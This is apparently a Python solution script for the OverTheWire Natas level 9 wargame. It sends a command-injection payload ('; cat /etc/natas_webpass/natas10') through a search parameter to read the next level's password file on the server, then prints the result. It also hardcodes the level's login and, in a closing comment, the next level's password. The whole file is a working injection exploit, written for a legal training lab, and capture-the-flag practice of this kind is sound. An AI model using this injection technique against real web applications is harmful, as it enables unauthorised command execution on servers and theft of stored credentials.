# natas9

import requests
from pwn import log
from bs4 import BeautifulSoup

url = 'http://natas9.natas.labs.overthewire.org'
username = "natas9"
password = "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t"
auth = (username, password)
rce = '; cat /etc/natas_webpass/natas10'
def exploit():
    params = {
        'needle': rce,
        'submit': 'Search'
    }

    res = requests.get(url, params=params, auth=auth)
    soup = BeautifulSoup(res.text, 'html.parser')
    try:
        pre = soup.find('pre')
        flag = pre.get_text(separator='\n', strip=True).splitlines()[0]  
        log.info(flag)
    except:
        log.error("pre not found")
        exit(1)

if __name__ == '__main__':
    exploit()

# natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu